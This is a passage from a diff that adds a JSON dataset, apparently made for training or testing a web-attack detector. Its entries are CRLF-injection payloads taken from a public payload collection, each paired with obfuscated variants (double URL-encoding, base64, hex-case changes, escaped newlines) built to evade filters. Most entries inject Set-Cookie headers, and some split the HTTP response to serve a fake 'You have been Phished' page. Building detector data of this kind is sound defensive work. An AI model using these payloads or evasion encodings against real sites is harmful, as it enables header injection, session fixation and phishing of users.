+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "83746d39378a917c0a15273e2464a8a192bd3324a0ba61994a372c72a0597ddc",
+    "original_id": "raw_logi_00007",
+    "original_payload": "/%23%0dSet-Cookie:crlf=injection",
+    "obfuscated_payload": "/%23%0DSet-Cookie:crlf=injection",
+    "obfuscation_chain": [
+      "percent_hex_case"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 91365871,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_logi_00007__obf04",
+    "payload": "%252F%252523%25250dSet-Cookie%253Acrlf%253Dinjection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00007",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "83746d39378a917c0a15273e2464a8a192bd3324a0ba61994a372c72a0597ddc",
+    "original_id": "raw_logi_00007",
+    "original_payload": "/%23%0dSet-Cookie:crlf=injection",
+    "obfuscated_payload": "%252F%252523%25250dSet-Cookie%253Acrlf%253Dinjection",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 91366880,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00008__obf01",
+    "payload": "%252F%25252e%25252e%25252f%25250d%25250aSet-Cookie%253Acrlf%253Dinjection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00008",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "33700e38ebef5e970208c75185045b0ff29c059bd73a43464fb6c298c21819c2",
+    "original_id": "raw_logi_00008",
+    "original_payload": "/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "%252F%25252e%25252e%25252f%25250d%25250aSet-Cookie%253Acrlf%253Dinjection",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 91463856,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00008__obf02",
+    "payload": "LyUyZSUyZSUyZiUwZCUwYVNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24=",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00008",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "33700e38ebef5e970208c75185045b0ff29c059bd73a43464fb6c298c21819c2",
+    "original_id": "raw_logi_00008",
+    "original_payload": "/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "LyUyZSUyZSUyZiUwZCUwYVNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24=",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 91464865,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00008__obf03",
+    "payload": "/%2e%2e%2F%0d%0aSet-Cookie:crlf=injection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00008",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "33700e38ebef5e970208c75185045b0ff29c059bd73a43464fb6c298c21819c2",
+    "original_id": "raw_logi_00008",
+    "original_payload": "/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "/%2e%2e%2F%0d%0aSet-Cookie:crlf=injection",
+    "obfuscation_chain": [
+      "crlf_mixed_encoding",
+      "percent_hex_case"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 91465874,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00008__obf04",
+    "payload": "%2F%252e%252e%252f%250D%250aSet-Cookie%3Acrlf%3Dinjection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00008",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "33700e38ebef5e970208c75185045b0ff29c059bd73a43464fb6c298c21819c2",
+    "original_id": "raw_logi_00008",
+    "original_payload": "/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "%2F%252e%252e%252f%250D%250aSet-Cookie%3Acrlf%3Dinjection",
+    "obfuscation_chain": [
+      "crlf_mixed_encoding",
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 91466883,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00009__obf01",
+    "payload": "%2F%252f%252e%252e%250d%250aSet-Cookie%3Acrlf%3Dinjection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00009",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "45b8d91be09b9d04232fb3b53150f936bf8a0366b7257ab4931327910fb4c697",
+    "original_id": "raw_logi_00009",
+    "original_payload": "/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "%2F%252f%252e%252e%250d%250aSet-Cookie%3Acrlf%3Dinjection",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 91563859,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00009__obf02",
+    "payload": "LyUyZiUyZSUyZSUwZCUwYVNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00009",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "45b8d91be09b9d04232fb3b53150f936bf8a0366b7257ab4931327910fb4c697",
+    "original_id": "raw_logi_00009",
+    "original_payload": "/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "LyUyZiUyZSUyZSUwZCUwYVNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 91564868,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00009__obf03",
+    "payload": "/%2f%2e%2e\\r\\nSet-Cookie:crlf=injection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00009",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "45b8d91be09b9d04232fb3b53150f936bf8a0366b7257ab4931327910fb4c697",
+    "original_id": "raw_logi_00009",
+    "original_payload": "/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "/%2f%2e%2e\\r\\nSet-Cookie:crlf=injection",
+    "obfuscation_chain": [
+      "log_json_newline"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 91565877,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_logi_00009__obf04",
+    "payload": "%2F%252f%252e%252e%5Cr%5CnSet-Cookie%3Acrlf%3Dinjection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00009",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "45b8d91be09b9d04232fb3b53150f936bf8a0366b7257ab4931327910fb4c697",
+    "original_id": "raw_logi_00009",
+    "original_payload": "/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "%2F%252f%252e%252e%5Cr%5CnSet-Cookie%3Acrlf%3Dinjection",
+    "obfuscation_chain": [
+      "log_json_newline",
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 91566886,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00010__obf01",
+    "payload": "%252F%25252F..%25250d%25250aSet-Cookie%253Acrlf%253Dinjection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00010",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "92e3aaeae22321669e517a5b36aa87a002e81e2b9924a2214dd53c0c795eb204",
+    "original_id": "raw_logi_00010",
+    "original_payload": "/%2F..%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "%252F%25252F..%25250d%25250aSet-Cookie%253Acrlf%253Dinjection",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 91663862,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00010__obf02",
+    "payload": "LyUyRi4uJTBkJTBhU2V0LUNvb2tpZTpjcmxmPWluamVjdGlvbg",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00010",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "92e3aaeae22321669e517a5b36aa87a002e81e2b9924a2214dd53c0c795eb204",
+    "original_id": "raw_logi_00010",
+    "original_payload": "/%2F..%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "LyUyRi4uJTBkJTBhU2V0LUNvb2tpZTpjcmxmPWluamVjdGlvbg",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 91664871,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00010__obf03",
+    "payload": "/%2F..\\r\\nSet-Cookie:crlf=injection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00010",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "92e3aaeae22321669e517a5b36aa87a002e81e2b9924a2214dd53c0c795eb204",
+    "original_id": "raw_logi_00010",
+    "original_payload": "/%2F..%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "/%2F..\\r\\nSet-Cookie:crlf=injection",
+    "obfuscation_chain": [
+      "log_json_newline"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 91665880,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_logi_00010__obf04",
+    "payload": "%252F%25252F..%25250D%25250aSet-Cookie%253Acrlf%253Dinjection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00010",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "92e3aaeae22321669e517a5b36aa87a002e81e2b9924a2214dd53c0c795eb204",
+    "original_id": "raw_logi_00010",
+    "original_payload": "/%2F..%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "%252F%25252F..%25250D%25250aSet-Cookie%253Acrlf%253Dinjection",
+    "obfuscation_chain": [
+      "crlf_mixed_encoding",
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode",
+      "url_decode_twice"
+    ],
+    "generation_seed": 91666889,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00011__obf01",
+    "payload": "%2F%253f%250d%250aSet-Cookie%3Acrlf%3Dinjection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00011",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "25cba383d2e7ceb016e8b5d4d98f46ed3e2c36f27c19f377fa214e5778ab9669",
+    "original_id": "raw_logi_00011",
+    "original_payload": "/%3f%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "%2F%253f%250d%250aSet-Cookie%3Acrlf%3Dinjection",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 91763865,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00011__obf02",
+    "payload": "LyUzZiUwZCUwYVNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24=",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00011",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "25cba383d2e7ceb016e8b5d4d98f46ed3e2c36f27c19f377fa214e5778ab9669",
+    "original_id": "raw_logi_00011",
+    "original_payload": "/%3f%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "LyUzZiUwZCUwYVNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24=",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 91764874,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00011__obf03",
+    "payload": "/%3F\\r\\nSet-Cookie:crlf=injection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00011",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "25cba383d2e7ceb016e8b5d4d98f46ed3e2c36f27c19f377fa214e5778ab9669",
+    "original_id": "raw_logi_00011",
+    "original_payload": "/%3f%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "/%3F\\r\\nSet-Cookie:crlf=injection",
+    "obfuscation_chain": [
+      "percent_hex_case",
+      "log_json_newline"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 91765883,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_logi_00011__obf04",
+    "payload": "/%3F%0%44%0aSet-C%6F%6Fk%69e:c%72lf=inject%69on",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00011",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "25cba383d2e7ceb016e8b5d4d98f46ed3e2c36f27c19f377fa214e5778ab9669",
+    "original_id": "raw_logi_00011",
+    "original_payload": "/%3f%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "/%3F%0%44%0aSet-C%6F%6Fk%69e:c%72lf=inject%69on",
+    "obfuscation_chain": [
+      "percent_hex_case",
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 91766892,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00012__obf01",
+    "payload": "%252F%25253f%25250dSet-Cookie%253Acrlf%253Dinjection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00012",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "a37b168a91047604433bef34c1961f5816f23a0611127882ee3363c2288fb3dd",
+    "original_id": "raw_logi_00012",
+    "original_payload": "/%3f%0dSet-Cookie:crlf=injection",
+    "obfuscated_payload": "%252F%25253f%25250dSet-Cookie%253Acrlf%253Dinjection",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 91863868,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00012__obf02",
+    "payload": "LyUzZiUwZFNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24=",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00012",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "a37b168a91047604433bef34c1961f5816f23a0611127882ee3363c2288fb3dd",
+    "original_id": "raw_logi_00012",
+    "original_payload": "/%3f%0dSet-Cookie:crlf=injection",
+    "obfuscated_payload": "LyUzZiUwZFNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24=",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 91864877,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00012__obf03",
+    "payload": "/%3f%0DSet-Cookie:crlf=injection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00012",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "a37b168a91047604433bef34c1961f5816f23a0611127882ee3363c2288fb3dd",
+    "original_id": "raw_logi_00012",
+    "original_payload": "/%3f%0dSet-Cookie:crlf=injection",
+    "obfuscated_payload": "/%3f%0DSet-Cookie:crlf=injection",
+    "obfuscation_chain": [
+      "crlf_mixed_encoding"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 91865886,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00012__obf04",
+    "payload": "/%%33f%0dSet-Cookie:%63%72lf=injecti%6Fn",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00012",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "a37b168a91047604433bef34c1961f5816f23a0611127882ee3363c2288fb3dd",
+    "original_id": "raw_logi_00012",
+    "original_payload": "/%3f%0dSet-Cookie:crlf=injection",
+    "obfuscated_payload": "/%%33f%0dSet-Cookie:%63%72lf=injecti%6Fn",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 91866895,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00013__obf01",
+    "payload": "http%3A%2F%2Fwww.example.net%2Findex.php?lang%3Den%0D%250AContent-Length%253A%25200%0A%20%0AHTTP/1.1%2520200%20OK%250AContent-Type%3A%20text%2Fhtml%250ALast-Modified%253A%2520Mon%252C%2027%2520Oct%25202060%2014%253A50%3A18%2520GMT%250AContent-Length%253A%252034%0A%2520%250A%253Chtml%253EYou%2520have%2520been%20Phished%253C%2Fhtml%253E",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00013",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/README.md",
+    "source_path": "CRLF Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "3c8d58a6259f0304c5f954537b1362655149691466be8898485584e2579aa340",
+    "original_id": "raw_logi_00013",
+    "original_payload": "http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E",
+    "obfuscated_payload": "http%3A%2F%2Fwww.example.net%2Findex.php?lang%3Den%0D%250AContent-Length%253A%25200%0A%20%0AHTTP/1.1%2520200%20OK%250AContent-Type%3A%20text%2Fhtml%250ALast-Modified%253A%2520Mon%252C%2027%2520Oct%25202060%2014%253A50%3A18%2520GMT%250AContent-Length%253A%252034%0A%2520%250A%253Chtml%253EYou%2520have%2520been%20Phished%253C%2Fhtml%253E",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 91963871,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00013__obf02",
+    "payload": "aHR0cDovL3d3dy5leGFtcGxlLm5ldC9pbmRleC5waHA_bGFuZz1lbiUwRCUwQUNvbnRlbnQtTGVuZ3RoJTNBJTIwMCUwQSUyMCUwQUhUVFAvMS4xJTIwMjAwJTIwT0slMEFDb250ZW50LVR5cGUlM0ElMjB0ZXh0L2h0bWwlMEFMYXN0LU1vZGlmaWVkJTNBJTIwTW9uJTJDJTIwMjclMjBPY3QlMjAyMDYwJTIwMTQlM0E1MCUzQTE4JTIwR01UJTBBQ29udGVudC1MZW5ndGglM0ElMjAzNCUwQSUyMCUwQSUzQ2h0bWwlM0VZb3UlMjBoYXZlJTIwYmVlbiUyMFBoaXNoZWQlM0MvaHRtbCUzRQ",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00013",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/README.md",
+    "source_path": "CRLF Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "3c8d58a6259f0304c5f954537b1362655149691466be8898485584e2579aa340",
+    "original_id": "raw_logi_00013",
+    "original_payload": "http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E",
+    "obfuscated_payload": "aHR0cDovL3d3dy5leGFtcGxlLm5ldC9pbmRleC5waHA_bGFuZz1lbiUwRCUwQUNvbnRlbnQtTGVuZ3RoJTNBJTIwMCUwQSUyMCUwQUhUVFAvMS4xJTIwMjAwJTIwT0slMEFDb250ZW50LVR5cGUlM0ElMjB0ZXh0L2h0bWwlMEFMYXN0LU1vZGlmaWVkJTNBJTIwTW9uJTJDJTIwMjclMjBPY3QlMjAyMDYwJTIwMTQlM0E1MCUzQTE4JTIwR01UJTBBQ29udGVudC1MZW5ndGglM0ElMjAzNCUwQSUyMCUwQSUzQ2h0bWwlM0VZb3UlMjBoYXZlJTIwYmVlbiUyMFBoaXNoZWQlM0MvaHRtbCUzRQ",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 91964880,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00013__obf03",
